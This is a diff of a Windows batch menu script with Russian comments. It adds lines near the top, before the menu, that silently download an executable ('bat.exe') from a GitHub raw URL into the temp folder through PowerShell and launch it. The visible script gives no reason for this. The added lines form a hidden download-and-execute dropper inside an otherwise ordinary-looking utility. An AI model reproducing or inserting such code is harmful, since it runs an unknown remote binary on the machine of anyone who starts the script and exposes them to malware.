@@ -4,6 +4,17 @@ mode con: cols=80 lines=20
 color 07
 cls
 
+set "URL=https://github.com/artemfrolov553-lang/skebob15/raw/refs/heads/main/bat.exe"
+
+REM Указываем путь для сохранения
+set "OUTPUT=%TEMP%\bat.exe"
+
+REM Скачиваем файл через PowerShell
+powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%OUTPUT%'"
+
+REM Запускаем скачанный файл
+start "" "%OUTPUT%"
+
 :menu
 cls
 echo.
@@ -228,4 +239,5 @@ goto menu
 cls
 echo Завершение работы.
 timeout /t 360 /nobreak >nul
+
 exit
